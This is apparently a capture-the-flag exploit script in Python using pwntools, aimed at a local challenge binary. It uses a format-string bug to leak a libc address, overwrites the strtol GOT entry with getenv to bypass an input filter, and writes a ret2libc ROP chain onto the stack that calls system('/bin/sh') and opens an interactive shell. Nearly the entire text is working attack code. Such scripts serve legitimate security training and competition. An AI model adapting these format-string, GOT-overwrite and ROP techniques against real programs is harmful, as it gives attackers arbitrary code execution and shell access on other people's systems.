from pwn import *

def pad(s, l):
	while len(s) < l:
		s += b"|"
	return s

libc = ELF("libc.so.6")
strtol = libc.sym["strtol"]
getenv = libc.sym["getenv"] # any other function that has similar properties would work here
system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))
poprdi = 0x2a3e5 # ROPgadget --binary libc.so.6 | grep "pop rdi"
ret = poprdi + 1 # ROPgadget

r = process('./chall') #, level='debug')
#r = gdb.debug('./chall', gdbscript='b *main+266') #\nb *main+297') # 263

strtol_at_got = 0x404030 # GOT entry for strtol

# leak got entry of setvbuf to recover libc base
def leak_got(r):
	r.recvuntil(b'>> ')
	r.sendline(b"%11$s|||" + p64(strtol_at_got))
	return r.recv(8).rstrip(b'|')

# recompute libc addresses
strtol_addr = int.from_bytes(leak_got(r), "little")
libc_base = strtol_addr - strtol
getenv += libc_base
system += libc_base
bin_sh += libc_base
poprdi += libc_base
ret += libc_base
print(f'[*] Recovered libc base', hex(libc_base))

# overwrite strtol in got with get_env, which will always return NULL in this case
def overwrite_qword(r, addr_start, value):
	ss = []
	for i in range(8):
		val = value % 256
		value >>= 8
		ss.append((addr_start + i, val))
	ss = sorted(ss, key=lambda x:x[1])
	# print(ss)
	pload = b''
	cnt = 0
	ii = 49 # %10$p -> 0, %49$p -> 312
	for addr, val in ss:
		pload += b'A' * (val - cnt) + f"%{ii}$hhn".encode() 
		cnt = val
		ii += 1
	pload = pad(pload, 312)
	for addr, _ in ss:
		pload += p64(addr)
	if b'\n' in pload:
		print("[!] ERROR, NEWLINE IN PAYLOAD. WILL TRIGGER SIGSEGV. RESTART AND GET BETTER LUCK")
		r.close()
		exit()

	r.recvuntil(b'>> ')
	r.sendline(pload)

overwrite_qword(r, strtol_at_got, getenv)
# Now the filter is pretty much gone. This is because the arguments piped into getenv are always invalid, and getenv always returns NULL in such cases
print("[*] GOT Overwritten; Filter Partial Bypass Achieved")

# Get stack address and write rop chain
r.recvuntil(b'>> ')
r.sendline(b'%65$p')
stack_addr = eval(r.recvline().rstrip())
print("[*] Found stack leak at", hex(stack_addr))

rop_addr = stack_addr - 0x110
overwrite_qword(r, rop_addr, poprdi)
overwrite_qword(r, rop_addr+8, bin_sh)
overwrite_qword(r, rop_addr+16, ret)
overwrite_qword(r, rop_addr+24, system)

# Restore strtol
overwrite_qword(r, strtol_at_got, strtol_addr)

# Break the while loop and trigger ret2libc rop chain
r.recvuntil(b'>> ')
r.sendline(b'%58$p') # this payload is now deemed illegal as our filter has been restored
r.interactive()